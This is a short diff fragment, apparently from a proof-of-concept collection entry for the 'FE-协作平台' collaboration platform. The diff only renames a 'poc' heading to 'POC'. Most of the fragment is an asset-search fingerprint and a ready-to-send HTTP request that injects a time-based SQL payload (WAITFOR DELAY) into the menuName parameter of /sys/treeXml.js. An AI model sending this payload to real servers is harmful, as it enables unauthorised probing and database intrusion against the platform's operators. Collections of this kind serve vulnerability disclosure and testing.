@@ -8,7 +8,7 @@
 app="FE-协作平台"
 ```
 
-## poc
+## POC
 
 ```
 GET /sys/treeXml.js%70?menuName=1';WAITFOR+DELAY+'0:0:5'--&type=function HTTP/1.1 
